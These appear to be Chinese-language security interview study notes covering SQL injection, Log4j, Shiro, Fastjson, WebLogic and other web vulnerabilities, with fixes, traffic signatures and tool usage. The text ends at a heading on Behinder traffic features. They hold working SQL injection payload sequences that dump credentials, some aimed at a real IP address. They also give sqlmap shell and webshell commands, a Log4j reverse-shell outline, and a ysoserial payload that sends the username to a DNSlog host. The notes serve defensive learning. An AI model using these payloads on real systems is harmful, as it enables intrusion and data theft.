1.SQL注入
-------

### 危害

#### 1.破坏

- 对数据库增删改查

#### 2.窃取

- 敏感数据
- 提权/写入shell

### 类型

#### 1.按注入点

- 字符型
- 数字型
- 搜索型

#### 2.按提交方式

- get
- post
- cookie

#### 3.执行效果

- 联合
- 报错
- 布尔
- 时间

### 不同形式的注入方式

#### information\_schema注入：

&lt;u&gt;**information\_schema数据库是mysql系统自带的数据库，其中保存着关于mysql服务器所维护的的所有其他数据库的信息，仅在mysql的5.0版本以上支持**&lt;/u&gt;

##### 流程

1. and 1 =1或者and 1=2 或者 or 1=1 测试注入点' and 1=1--
2. order by 数字 排序 判断有几个字段
3. 获取数据库的库名用 union select database() 字段数取第二步的值。例3个字段and 1 = 2' union select database(),user(),0--
4. 获取表名用 union 查询 information\_schema库的tables表的信息and 1 = 2' union select table\_schema ,table\_name,0 from information\_schema.tables where table\_schema='abc'--
5. 获取表的字段名 假设上一步查出有users表用 union 查询 information\_schema库的columns表的信息and 1 = 2' union select table\_name,column\_name,0 from information\_schema.columns where table\_name='users'--
6. 获取字段值 假设上一步查出password字段用 union select users表里 password字段的信息and 1 = 2' union select username,password,0 from users--

#### 基于函数报错注入(insert,update,delete):

**&lt;u&gt;updatexml()函数原理：原理是第二个参数需要xpath格式的字符串我们传入的参数格式不符合要求时然后就报错&lt;/u&gt;**

##### 流程

1. 爆数据库版本信息k' and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) #
2. 爆数据库当前用户k' and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)#
3. 爆数据库k' and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) #
4. 爆表获取数据库表名，输入：k'and updatexml(1,concat(0x7e,(select table\_name from information\_schema.tables where table\_schema='abc'limit 0,1), 0x7e),0)#
5. 爆字段获取字段名，输入：k' and updatexml(1,concat(0x7e,(select column\_name from information\_schema.columns where table\_name='users'limit 2,1), 0x7e),0)#
6. 爆字段内容获取字段内容，输入：k' and updatexml(1,concat(0x7e,(select password from users limit 0,1), 0x7e),0)#

###### insert：

1. 爆表名'or updatexml(1,concat(0x7e,(select table\_name from information\_schema.tables where table\_schema='pikachu' limit 0,1)),0) or'
2. 爆列名' or updatexml(1,concat(0x7e,(select column\_name from information\_schema.columns where table\_name='users'limit 2,1)),0) or'
3. 爆内容' or updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) or' 测试 oldboy'or updatexml(1,concat(0x7e,(命令)),0) or'

###### update ：

(与insert相同)

###### delete：

delete from message where id=56 or updatexml(2,concat(0x7e,(database())),0)

#### extractvalue()函数注入流程

原理和updatexml()差不多

#### 流程

1. 判断闭合?id=1'--+
2. 当前使用数据库?id=1' and extractvalue(1,concat(0x7e,database(),0x7e)) --+
3. 当前使用数据库的表名?id=1' and extractvalue(1,concat(0x7e,(select table\_name from information\_schema.tables where table\_schema=database() limit 0,1),0x7e)) --+
4. 当前使用数据库的列名?id=1' and extractvalue(1,concat(0x7e,(select column\_name from information\_schema.columns where table\_schema=database() and table\_name='users' limit 0,1),0x7e)) --+
5. 获取数据?id=1' and extractvalue(1,concat(0x7e,(select concat(id,':',username,':',password) from users limit 0,1),0x7e)) --+

#### floor函数注入流程：

**&lt;u&gt;floor函数注入原理是插入重复主键导致报错&lt;/u&gt;**

##### 流程

1. 判断闭合[http://120.25.24.45:31885/?id=1'--+](https://link.zhihu.com/?target=http%3A//120.25.24.45%3A31885/%3Fid%3D1'--%2B)
2. 判断列数[http://120.25.24.45:31885/?id=1](https://link.zhihu.com/?target=http%3A//120.25.24.45%3A31885/%3Fid%3D1)' order by 3 --+
3. 获取当前数据库[http://120.25.24.45:31885/?id=1](https://link.zhihu.com/?target=http%3A//120.25.24.45%3A31885/%3Fid%3D1)' union select 1,count(\*),concat(database(),floor(rand(14)\*2)) as x from information\_schema.tables group by x--+
4. 获取当前数据库表名[http://120.25.24.45:31885/?id=1](https://link.zhihu.com/?target=http%3A//120.25.24.45%3A31885/%3Fid%3D1)' union select 1,count(\*),concat((select group\_concat(table\_name) from information\_schema.tables where table\_schema=database()),floor(rand(14)\*2)) as x from information\_schema.tables group by x--+
5. 获取某张表的列名[http://120.25.24.45:31885/?id=1](https://link.zhihu.com/?target=http%3A//120.25.24.45%3A31885/%3Fid%3D1)' union select 1,count(\*),concat((select group\_concat(column\_name) from information\_schema.columns where table\_schema=database() and table\_name='表名'),floor(rand(14)\*2)) as x from information\_schema.tables group by x--+

#### 布尔盲注

**&lt;u&gt;基于不同的返回页面判断数据库语言是否执行成功,从而跑出数据库内容&lt;/u&gt;**

##### 常用函数

1. substr(需要截取的东西，从哪开始，截取多少) 截取字符串
2. mid(需要截取的东西，从哪开始，截取多少) 截取字符串
3. left(string,n) 截取最左边的字符
4. right(string,n) 截取最右边的字符
5. ascii('a') 转换成ascii码
6. ord('b') 和ascii功能一样
7. char(97) 和ascii相反
8. length() 长度

##### 流程

1. 判断闭合方式?id=1' --+通过页面的you are in变化判断是否执行成功。
2. 获取数据库名字长度?id=1' and length(database())=8 --+
3. 获取当前数据库名每个字母 （依次改变N的值获取当前数据库每个字母，这个N是从1开始）?id=1' and ascii(substr(database(),N,1))=101--+
4. 获取总共有多少张表?id=1' and (select count(*) from information\_schema.tables where table\_schema=database())=4 --+*
5. 获取每个表的长度 （依次改变N的值，来获取每张表的长度 (limin N，1) N是从0开始）?id=1' and (select length(table\_name) from information\_schema.tables where table\_schema=database() limit N,1 )&gt;6--+\*
6. 获取每张表名字?id=1' and (select ascii(substr(table\_name,1,1)) from information\_schema.tables where table\_schema=database() limit 0,1 )=101--+\*
7. 获取列的个数?id=1' and (select count(\*) from information\_schema.columns where table\_schema=database() and table\_name='users')&gt;3--+
8. 获取每个列的长度?id=1' and (select length(column\_name) from information\_schema.columns where table\_schema=database() and table\_name='users' limit 0,1 )&gt;2--+
9. 获取列名?id=1' and (select ascii(substr(column\_name,1,1)) from information\_schema.columns where table\_schema=database() and table\_name='users' limit 0,1 )&gt;105--+
10. 获取数据长度?id=1' and (select length(username) from users limit 0,1)&gt;4--+
11. 获取数据?id=1' and (select ascii(substr(username,1,1)) from users limit 0,1)&gt;68--+

#### 时间盲注

&lt;u&gt;**盲注适用场景一般用于无法用布尔真假判断，也无法报错注入时使用**&lt;/u&gt;&lt;br&gt;  
&lt;br&gt;  
&lt;u&gt;**原理：利用if函数，执行判断，如果正确，直接返回(时间很短，网速有一定影响)，如果不正确，执行时间将延长，以上操作也可以反过来时间**&lt;/u&gt;

- 条件判断：if(condition,expr2,expr3) condition为true，返回expr2，否则返回expr3
- 延时函数：sleep（arg1）if（payload，sleep（3），1）#当sleep函数被过滤可以使用benchmark函数,还可以使用get\_lock方法盲注
- 函数benchmark（arg1，arg2）if(1=1,benchmark(30000000,encode("hello","123")),0); 如果测试语句正确，暂停3秒左右，受服务器的影响比较大

##### 流程

1. 通过sleep来确认闭合方式?id=1' and sleep(3) --+
2. 获取版本信息?id=1' and if(ascii(substr(version(),1,1))&gt;53,1,sleep(5))--+
3. 获取当前使用是数据库长度?id=1' and if(length(database())&gt;8,1,sleep(5)) --+
4. 获取当前使用数据库名?id=1' and if(ascii(substr(database(),1,1))=115,sleep(5),3)--+
5. 获取当前使用数据库表数量?id=1' and if((select count(table\_name) from information\_schema.tables where table\_schema=database())=4,sleep(3),3)--+
6. 获取每个表的长度?id=1' and if((select length(table\_name) from information\_schema.tables where table\_schema=database() limit 0,1)=8,sleep(5),1) --+
7. 获取每个表的表名?id=1' and if((select ascii(substr(table\_name,1,1)) from information\_schema.tables where table\_schema=database() limit 0,1)=114,sleep(5),1) --+
8. 获取表的列数?id=1' and if((select count(\*) from information\_schema.columns where table\_schema=database() and table\_name='emails')=2,sleep(5),1) --+
9. 获取列的长度?id=1' and if((select length(column\_name) from information\_schema.columns where table\_schema=database() and table\_name='emails' limit 0,1)=2,sleep(5),1) --+
10. 获取每个列的列名?id=1' and if((select ascii(substr(column\_name,1,1)) from information\_schema.columns where table\_schema=database() and table\_name='emails' limit 0,1)=105,sleep(5),1) --+
11. 获取数据长度?id=1' and if((select length(username) from users limit 0,1)&gt;4,1,sleep(5)) --+
12. 获取数据?id=1' and if((select ascii(substr(username,1,1)) from users limit 0,1)&gt;68,1,sleep(5)) --+

### 工具:SQLmap

#### 常用基本参数

| 参数 | 用途 |
|---|---|
| -u | 指定目标url |
| -r | 从文件中加载http请求 |
| -d | 直接连接数据库 |
| -m | 从文件中获取多个URL |
| --users | 枚举目标DBMS所有的用户 |
| --roles | 枚举DBMS用户的角色 |
| --dbs | 枚举DBMS所有的数据库 |
| --tables | 枚举DBMS数据库中所有的表 |
| --columns | 枚举DBMS数据库表中所有的列 |
| --os-cmd= | 执行操作系统命令 |
| --os-shell | 交互式的系统shell |
| --os-esc | 数据库进程用户权限提升 |

#### 常用请求

| 参数 | 用途 |
|---|---|
| -A | 指定user-agent头 |
| -H | 额外的header |
| -method= | 指定HTTP方法（GET/POST） |
| --data= | 通过POST提交数据 |
| --cookie= | 指定cookie的值 |
| --proxy= | 使用代理 |
| --delay= | 设置延迟时间（两个请求之间） |
| --threads=value | 设置线程(默认 1) |

#### 常用注入参数

| 参数 | 用途 |
|---|---|
| -p | 指定测试参数 |
| --level= | 指定测试的等级 |
| --risk= | 指定测试的风险 |
| --technique= | 指定sql注入技术（默认BEUSTQ） |
| --tamper=" " | 指定使用的脚本 |
| --os= | 指定DBMS操作系统 |

- --level=LEVEL 执行测试的等级（1-5，默认为1）数值&gt;=2的时候也会检查cookie里面的数，当&gt;=3的时候将查User-agent和Referer，当=5的时候检查host
- --risk=RISK 执行测试的风险（0-3，默认为1）默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试

#### 举例

1. GET参数注入

`sqlmap -u "http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1"`

2. POST参数注入

`sqlmap -u "http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1"  --data="id=1"`

3. cookie等请求头注入 （level&gt;=2时才会检测cookie）

`sqlmap -u "http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1" --level 2`

对请求包文件进行注入时，用 \* 号指定cookie为注入点，这样就可以检测cookie。

`sqlmap  -r"/root/1.txt"`

#### 其他参数举例

1. --current-user：大多数数据库中可检测到数据库管理系统当前用户
2. --current-db：当前连接数据库名
3. --is-dba：判断当前的用户是否为管理
4. --users：列出数据库所有所有用户
5. 获取表名--tables: sqlmap.py -u URL -D 数据库名称 --tables
6. 字段名--columns: sqlmap.py -u URL -D 数据库名 -T 表名 --columns
7. 数据内容: -T 表名 -C username，password --dump
8. 读文件内容:--file-read /etc/password
9. 系统交互的shell: --os-shell
10. 写webshell：--file-write "c:/1.txt” --file-dest “C:/php/htdocs/sql.php” -v1 
    1. 将c:/1.txt文件上传到C:/php/htdocs/下,改名为sql.php
11. sqlmap过waf : --tamper ""

### SQL注入防御

- 对关键函数或字符过滤如 ：union select order by information\_schema 等
- 下载相关防范注入文件，通过incloude函数包含在网站配置文件里面
- pdo预处理，使用预编译语句
- 添加白名单来规范输入验证方法
- 对客户端输入进行控制，限制特殊字符和函数的输入
- 对数据库给与最小权限
- 增加waf 安全狗 防火墙等

### SQL注入重要内容

#### SQL注入绕过waf

- 大小写双写
- 使用编码：unioncode编码 十六进制编码 url编码
- 等价函数 如：mid，substr（） ==&gt;substring（） &amp;&amp;和||==&gt; and 和or =号可以用&lt;&gt;因为如果不大于不小于就是等于
- 内联注释
- 更换提交方式
- 垃圾数据
- 参数污染等等方式

#### SQL注入写shell

##### 条件

1. &lt;u&gt;**知道web服务器的绝对路径**&lt;/u&gt;
2. &lt;u&gt;**数据库具有root权限**&lt;/u&gt;
3. &lt;u&gt;**secure\_file\_priv函数没有特殊的值**&lt;/u&gt;
4. &lt;u&gt;**PHP关闭魔术引号，php主动转义功能关闭**&lt;/u&gt;

##### SQL写入shell的方式

1. 通过本地写入into outfile函数
2. 通过日志写入需要对 general\_log 和 general\_log\_file 变量进行更改
3. 通过sqlmap --os-shell命令写入

```php
sqlmap -u 网址 --is-dba
```

```php
sqlmap -u 网址 --sql-shell
```

然后再在sql-shell中直接使用sql命令读取数据库文件存放路径：

```php
sql-shell> select @@datadir;
```

然后通过数据库文件的位置进行网站所在的绝对路径进行猜测  
3\. 写入shell

```php
sqlmap -u 网址 --os-shell
```

选择语言后,选择可写目录,选择自定义目录后手动输入获得的网站绝对路径,拿到shell

2. 探知网站绝对路径:
3. 确认注入点权限是否为root权限:

### SQL注入其他形式

### SQL注入其他形式

1. 二次注入：原理后端代码对用户输入的数据进行了转义，然后在保存到数据库的时候是没有进行转义，然后再从数据库当中取出数据的时候，没有对数据库中的特殊字符进行转义和验证，就可能形成闭合，导致注入 
    1. 防御：使用统一编码格式utf-8对用户输入的内容进行验证过滤
2. 宽字节注入：原理是php后端代码和数据库编码格式不一至，比如我输入一个%df单引号的话，php代码会对单引号使用\\进行转义，这时候我们输入url编码内容就是%df%5c单引号，由于gbk编码的特性就是两个字节为一个字符，将%df和%5c转义成一个汉字，这是单引号就可以进行逃逸进行闭合

- - - - - -

2.log4j漏洞
---------

### 简述

该漏洞主要是由于日志在打印时当遇到`${`后，以:号作为分割，将表达式内容分割成两部分，前面一部分prefix，后面部分作为key，然后通过prefix去找对应的lookup，通过对应的lookup实例调用lookup方法，最后将key作为参数带入执行，引发远程代码执行漏洞

### 受影响版本

- 2.0 &lt;= Apache Log4j &lt;= 2.15.0-rc1,2.15.0-rc2不受影响

### 主要流量特征

#### 强特征

- **&lt;u&gt;攻击者发送的数据包中可能存在${jndi:}字样，推荐使用全流量或WAF设备进行检索排查&lt;/u&gt;**
    - jndi注入,可以不是jndi,jndi有可能被拼接,但是一定有${},一般通过ldap远程加载class文件
    - 有时会出现在ua头,不在请求体

### 利用方法（了解）

1. 使用dnslog探测log4j漏洞
2. 在自己的vps上,下载jndi注入器
3. 构造bash命令,如反弹shell命令,执行，会自动搭建rmi或ldap服务
4. 再在自己的vps上开启端口监听
5. 在存在漏洞的页面上构造payload,发送注入器提供的远程下载地址

### 攻击成功的特征

- 攻击的返回包状态码为200,有60%-70%的概率攻击成功
- 状态码为其他,也有可能攻击成功,需要上机排查（如400时可能会反弹shell）
- 看有没有对恶意payload进行外部请求

### 使用的服务/协议/规范

- JNDI: 命名与目录接口（Java Naming and Directory Interface）,用于引用数据源的规范
- LDAP: 轻型目录访问协议
- LDAPS: 安全的 LDAP
- RMI: 远程访问调用
- JRMP
- JMX
- JMS
- (可能)IIOP/CORBA
- Docker
- k8s
- web

### 加固方案

- 产品防护 
    - 加waf和IPS
- 临时防护( &gt;=2.10.0 版本) 
    - 添加jvm启动参数:-Dlog4j2.formatMsgNoLookups=true
    - 在应用classpath下添加log4j2.component.properties配置文件，文件内容为：log4j2.formatMsgNoLookups=true
    - 建议JDK使用8u191及以上的高版本

### 服务器端人工排查

- 相关用户可根据Java jar解压后是否存在org/apache/logging/log4j相关路径结构，判断是否使用了存在漏洞的组件，若存在相关Java程序包，则很可能存在该漏洞。
- 若程序使用Maven打包，查看项目的pom.xml文件中是否存在下图所示的相关字段，若版本号为小于2.15.0-rc2，则存在该漏洞。  
    ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-b2918c4bfc1c5fd9d14047825cdeea852a054b0d.jpeg)

### 其他

- 扫描器行为,可能在ua头出现Java等标识
- 看日志看返回包,看是否形成远程连接,或者作出响应
- - -

3.shiro反序列化漏洞
-------------

### 简述

Apache Shiro框架提供了记住我的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过相关信息进行序列化，然后使用AES加密（对称），最后再使用Base64编码处理。服务端在接收cookie时：

检索RememberMe Cookie的值=&gt;Base 64解码=&gt;AES解密（加密密钥硬编码,通常为默认密钥）=&gt;进行反序列化操作（未过滤处理）

攻击者可以使用Shiro的默认密钥构造恶意序列化对象进行编码来伪造用户的Cookie，服务端反序列化时触发漏洞，从而执行命令。

### 受影响版本

- Apache Shiro &lt;= 1.2.4 shiro-550
- Apache Shiro &lt;= 1.4.1 shiro-721

### 主要流量特征

#### 强特征

- 请求包cookie中有RememberMe字段,&lt;b&gt;&lt;u&gt;返回包中包含Set-Cookie: rememberMe=deleteMe字段&lt;/u&gt;&lt;/b&gt; 
    - 未登录:请求包cookie中没有rememberme字段,返回包set-Cookie里也没有deleteMe字段
    - 登陆失败:不管勾选RememberMe字段没有，返回包都会有rememberMe=deleteMe字段
    - 登陆成功: 
        - 不勾选RememberMe字段,返回包set-Cookie会有rememberMe=deleteMe字段。但是之后的所有请求中Cookie都不会有rememberMe字段
        - 勾选RememberMe字段,返回包set-Cookie会有rememberMe=deleteMe字段，还会有rememberMe字段，之后的所有请求中Cookie都会有rememberMe字段

### 利用方法

#### shiro550

##### 利用:

AES密钥硬编码在代码中,得到密钥后:

**&lt;u&gt;构造payload=&gt;序列化=&gt;AES编码=&gt;base64编码&lt;/u&gt;**

##### 修复:

- 去掉或替换默认密钥
- 升级shiro版本

#### shiro721

##### 利用:

- 首先利用ceye.io来搞一个DNSlog来作为yaoserial生成的payload:  
    java -jar ysoserial-master-30099844c6-1.jar CommonsBeanutils1 "ping %USERNAME%.jdjwu7.ceye.io" &gt; payload.class
- 再利用另一个脚本:  
    java -jar PaddingOracleAttack.jar targetUrl rememberMeCookie blockSize payloadFilePath  
    因为Shiro是用AES-CBC加密模式，所以blockSize的大小就是16  
    ![img](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-60ef83487aee53c90d3fefb2e582cd536c0596ec.jpeg)
- 运行后会在后台不断爆破，payload越长所需爆破时间就越长  
    ![img](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-274b34912c117eb910ac0f60b3f815a1d69407ef.jpeg)
- 将爆破的结果复制替换之前的cookie  
    ![img](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-afa432235173145014da426165c0d886c9841cf3.jpeg)

##### 修复:

- 升级shiro版本到1.4.2以上
- - -

4.fastjson
----------

### 简述

正常请求是get请求并且没有请求体，可以通过构造错误的POST请求，即可查看在返回包中是否有fastjson这个字符串来判断

fastjson漏洞利用原理  
在请求包里面中发送恶意的json格式payload，漏洞在处理json对象的时候，没有对@type字段进行过滤，从而导致攻击者可以传入恶意的TemplatesImpl类，而这个类有一个字段就是\_bytecodes，有部分函数会根据这个\_bytecodes生成java实例，这就达到fastjson通过字段传入一个类，再通过这个类被生成时执行构造函数

### 识别

1、根据返回包判断：  
任意抓个包，提交方式改为POST，花括号不闭合。返回包在就会出现fastjson字样。当然这个可以屏蔽，如果屏蔽使用其它办法。  
2、利用dnslog盲打：  
构造以下payload（content-type字段为application/json），利用dnslog平台接收：{"zeo":{"@type":"java.net.Inet4Address","val":"ntel8h.dnslog.cn"}}（不同版本，payload不同。推荐这种方式）

### 流量特征

- @type
- 加一个恶意类和命令

### 不出网

用BCEL库

### 修复

升级版本到1.2.51以上

- - - - - -

5.weblogic反序列化
--------------

### T3协议

T3协议是用于Weblogic服务器和其他Java Application之间传输信息的协议，是实现RMI远程过程调用的专有协议，其允许客户端进行JNDI调用。

### 判断是否攻击成功

1. 攻击成功会有明显的返回weblogic字样
2. 会有带加密格式的序列化字符串
3. 是否成功攻击要看日志，是否有调用恶意Java类，网络套接字，上传war包

回答1:

### 反序列化漏洞

#### CVE-2016-xxxx\\~CVE-2018-xxxx

- 全是基于T3协议的反序列化漏洞
- 2017\\~2018的反序列化属于weblogic JRMP反序列化
- 有一些是修复问题，不同的证书编号，可能是上一个漏洞的补丁绕过

### 权限绕过（利用链）

#### CVE-2020-14882（未授权访问）

攻击者可以构造特殊请求的URL，即可未授权访问并接管管理控制台（WebLogic Server Console）。访问后台后是一个低权限的用户，无法安装应用，也无法直接执行任意代码。

#### CVE-2020-14883（代码执行）

通过构造恶意URL链接，调用Java类，有两种，一种可以直接进行命令执行，但需要weblogic版本高于12.2.1，另一种是远程加载恶意xml，weblogic版本高于10.3.6即可。

回答2

1. 通过t3协议直接发送恶意反序列化对象
2. 利用t3协议配合jrmp或jndi接口反向发送反序列化数据
3. 通过javabean xml方式发送反序列化数据

### 修复

- 禁用T3协议
- 禁止启用IIOP
- 临时关闭后台/console/console.portal对外访问
- 升级官方安全补丁
- - -

6.PHP反序列化
---------

### 简述

把对象变成一个可以传输的字符串,为了方便传输.PHP文件在执行结束后会销毁对象,但有时候可能会用到销毁的了的对象,重复调用代码比较麻烦,于是有了序列化和反序列化,可以吧一个实例化对象长久的存在计算机磁盘上,调用的时候拿出来反序列化即可

### 漏洞原理

反序列化内容用户可控,且后台不正当地使用了魔术方法,使用户可以构造一个恶意的序列化字符串

### 利用流程

拿到代码,确定unserialize函数参数可控,然后看这些代码有哪些类,类中有哪些魔术方法,可以随着对象的创建或者销毁等操作调用哪些魔术方法,看魔术方法中有没有可以让我们利用的点,看类中有哪些参数可以通过反序列化修改,结合这些可以修改的参数和魔术方法中的利用点进行反序列化漏洞的利用

- - - - - -

7.XSS/CSRF/SSRF漏洞原理与区别
----------------------

XSS：跨站脚本攻击；  
CSRF：跨站请求伪造攻击；  
SSRF：服务器请求伪造攻击。  
区别：

- XSS是服务器对用户输入的数据没有进行足够的过滤，导致客户端浏览器在渲染服务器返回的html页面时，出现了预期值之外的脚本语句被执行。 
    - DOM型:取出和执行恶意代码由浏览器端完成,通过js改变html代码
    - 反射型恶意代码存在URL里,存储型恶意代码在数据库里
- CSRF：CSRF是服务器端没有对用户提交的数据进行随机值校验，且对http请求包内的refer字段校验不严，导致攻击者可以利用用户的Cookie信息伪造用户请求发送至服务器。
- SSRF：SSRF是服务器对 用户提供的可控URL过于信任，没有对攻击者提供的URL进行地址限制和足够的检测，导致攻击者可以以此为跳板攻击内网或其他服务器。

XXE漏洞了解吗？  
XXE漏洞即xml外部实体注入漏洞,发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口、攻击内网网站、发起dos攻击等危害。

- - - - - -

8.TP框架典型5.0+版本RCE
-----------------

### 漏洞触发方式

#### 5.x直接路由

或post传参

#### tp2.x漏洞原理

preg\_replace的/e模式路由匹配,可以导致代码执行,所以漏洞执行的触发点在解析URL路径的preg\_replace函数中

### 利用条件

- redis 服务以 root 账户运行(有.ssh目录并有写入权限)
- redis 无密码或弱密码进行认证
- redis 监听在 0.0.0.0 公网上

### 利用方法

- 通过Redis的Info命令可以查看服务相关的参数和敏感信息
- 上传SSH公钥获得SSH登录权限
- 通过crontab反弹Shell
- 利用Redis主从复制
- - -

Struts2
-------

### 较危险的反序列化/代码执行

#### S2-045/46(CVE-2017-5638)

通过`Content-Type`这个header头，进而执行命令，通过 Strus2 对错误消息处理进行回显

#### S2-062(CVE-2021-31805)

使用了 `%{…}` 语法进行强制`OGNL`解析时，有一些特殊的TAG属性可被二次解析，攻击者可构造恶意的`OGNL`表达式触发漏洞，从而实现远程代码执行

- - - - - -

Jboss
-----

### 简述

开源应用服务器,通常和Tomcat或者jetty绑定使用

### 未授权访问

直接进后台进行文件上传,最晚的也是2010年的,太老

### 反序列化导致的RCE

CVE-2013\\~2017

通过ysoserial生成payload,通过直接路由上传

- - - - - -

OWASP TOP10
-----------

- SQL 注入
    
    
    - 在退出、密码管理、超时、密码找回、帐户更新等方面存在漏洞
    - 修复：支持密码有效期、能够禁用帐户、不要存储用户密码、要求使用强密码、使用 SSL 保护会话身份验证 Cookie、限制会话寿命
- 失效的身份认证和会话管理
- 跨站脚本攻击 XSS
    
    
    - HttpOnly：禁止js获取cookie
    - DOM型依赖的是浏览器端的DOM解析
- 直接引用不安全的对象
    
    
    - 例如,可能出现URL中调用资源处能通过../../方式访问其他目录资源,实现任意文件读取的问题
- 安全配置错误
    
    
    - 不安全的默认配置、不完整的临时配置、开源云存储、错误的HTTP 标头配置以及包含敏感信息的详细错误信息
- 敏感信息泄露
    
    
    - 需要对敏感数据加密，这些数据包括：传输过程中的数据、存储的数据以及浏览器的交互数据
- 缺少功能级的访问控制
    
    
    - 未授权访问
- 跨站请求伪造 CSRF
- 使用含有已知漏洞的组件
- 未验证的重定向和转发
    
    
    - 钓鱼网站常用
    - 与ssrf不同,ssrf是调用外网无法访问的内网资源
- - -

安全设备
----

### 奇安信天眼

#### 设备类型:全流量

#### 大致使用方法

天眼首页截图:

左边监测控制台,打开,有告警信息:

分析时觉得IP有问题可以在攻击IP中搜索

打开告警列表(奇安信网神?):

点击详情,显示如下内容:

### 微步tdp/tip

#### TDP

主页面:

主要点击外部攻击的外部攻击项

告警主机项,上面可以查询IP:

内网渗透分析,被攻陷后可以看网络拓扑:

**优势项**:自动识别一些恶意IP,即答:&lt;u&gt;tdp威胁情报发现有利于溯源分析&lt;/u&gt;&lt;br&gt;  
&lt;br&gt;

### 青藤云HIDS

#### 设备类型:全流量

#### 大致使用方法

主页面,主机资产,安全台账功能,将可疑IP放到里面点击主机详情,看是不是内部IP:

点击入侵事件,查看告警,点击告警的漏洞名称,可以跳到类似于天眼的详情信息页面

可以查日志,筛选IP/域名/进程进行查询

**优势项**:可以直接发现暴力破解,不需要人工添加规则

### 明御安全网关

### 总结优势

- HIDS:对全网信息捕捉
- 微步:
    
    
    - 攻击发现，会显示攻击者画像 方便溯源分析
    - 威胁情报发现,发现恶意IP
- 亚信:ei拦截的恶意文件会自动在an中运行检测生成报告
    
    
    - ddei邮件网关,过滤垃圾邮件,对恶意文件隔离
    - ddan沙箱(=微步云沙箱):检测恶意文件,分析恶意样本,收集攻击信息,生成行为报告
- - -

中间件解析漏洞
-------

### IIS

1. 6.0目录解析漏洞:命名为`1.asp`的目录下的所有文件会以asp脚本形式运行
2. 6.0文件解析漏洞:xx.asp;.jpg将会当作xx.asp 
    1. IIS6.0 默认的可执行文件除了.asp，还包含这三种：.asa .cdx .cer
3. IIS7.0配置不当会导致`test.png`可以用`test.png/.php`的方式被执行

### Nginx

1. 早期版本,配置不当时,`1.png`图片马可以通过这样访问执行:`1.png/xxx.php`
    1. 原因是fastcgi处理.php文件时,发现文件不存在,直接解析1.png
2. 空字节解析(00截断)

### Apache

1. 早期版本,配置不当时,从右到左判断后缀,直到解析到能解析的后缀,如`1.php.a.b`,`.b`不认识,解析`.a`,还不认识就解析`.php`

- - - - - -

内存马
---

### 特征

1. (较弱特征)为了确保内存马在各种环境下都可以访问,需要把filter匹配的优先级调至最高
2. (较强特征)内存马的Filter是动态注册的，所以在web.xml中肯定没有配置
3. (强特征)特殊的classloader加载。Filter也是class，也是必定有特定的classloader加载。一般来说，正常的Filter都是由中间件的WebappClassLoader加载的。反序列化漏洞喜欢利用TemplatesImpl和bcel执行任意代码。所以这些class往往就是以下这两个：  
    这个特征是一个特别可疑的点了。当然了，有的内存马还是比较狡猾的，它会注入class到当前线程中，然后实例化注入内存马。这个时候内存马就有可能不是上面两个classloader 
    1. com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader
    2. com.sun.org.apache.bcel.internal.util.ClassLoader

- - - - - -

OSI七层模型与TCP/IP五层模型
------------------

### OSI七层模型

![OSI七层模型](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-c2f8442ddb1b8a044ca1607ef09030ce804b4e3c.jpeg)

1. 应用层：为计算机用户、各种应用程序以及网络提供接口，也为用户直接提供各种网络服务
2. 表示层：数据编码、格式转换、数据加密。提供各种用于应用层数据的编码和转换功能,确保一个系统的应用层发送的数据能被另一个系统的应用层识别
3. 会话层：创建、管理和维护会话。接收来自传输层的数据，负责建立、管理和终止表示层实体之间的通信会话，支持它们之间的数据交换。
4. 传输层：数据通信。建立主机端到端的链接，为会话层和网络层提供端到端可靠的和透明的数据传输服务，确保数据能完整的传输到网络层。
5. 网络层：IP选址及路由选择。控制数据链路层与传输层之间的信息转发，建立、维持和终止网络的连接。数据链路层的数据在这一层被转换为数据包
6. 数据链路层：提供介质访问和链路管理。接收来自物理层的位流形式的数据，封装成帧，传送到网络层；将网络层的数据帧，拆装为位流形式的数据转发到物理层
7. 物理层：管理通信设备和网络媒体之间的互联互通。传输介质为数据链路层提供物理连接，实现比特流的透明传输

TCP/IP五层模型为将5、6、7层合并为应用层

- - - - - -

常用协议/服务/端口
----------

21端口：FTP 文件传输服务  
22端口：SSH协议、SCP（文件传输）、端口号重定向  
23/tcp端口：TELNET 终端仿真服务  
25端口：SMTP 简单邮件传输协议  
53端口：DNS 域名解析服务  
69/udp：TFTP  
80/8080/3128/8081/9098端口：HTTP协议代理服务器  
135、137、138、139端口： 局域网相关默认端口，应关闭  
389端口：LDAP（轻量级目录访问协议）、ILS（定位服务）  
443/tcp 443/udp：HTTPS服务器  
465端口：SMTPS（简单邮件传输协议安全版）  
873端口：rsync（Linux文件同步协议）  
1433/tcp/udp端口：MS SQL*SERVER数据库server、MS SQL*SERVER数据库monitor  
1521端口：Oracle 数据库  
3389端口：WIN远程登录  
3306端口：MYSQL数据库端口  
6379端口：Redis数据库端口  
8080端口：TCP服务端默认端口、JBOSS、TOMCAT、Oracle XDB（XML 数据库）  
8888端口：Nginx服务器的端口

- - - - - -

工具方面
----

### nmap

- 全端口扫描 
    - nmap -sS -p 1-65535 -v IP
    - -v 为显示扫描过程
    - -p为指定端口扫描
    - -sS 为半开放扫描,因为不打开完全的tcp连接。一般不记入系统日志；-sT为TCP扫描
- 服务探测 
    - -sV
- ping扫描，扫描端口时会先通过ping确认主机存活 
    - 参数为-sP
    - -Pn参数为禁止扫描之前使用ping，因为一些主机会禁ping
- 操作系统探测 
    - -O，检测操作系统，但存在误报
    - -O --osscan-limit，针对指定目标进行操作系统检测

工具流量特征
------

### 冰蝎

#### 3.0特征

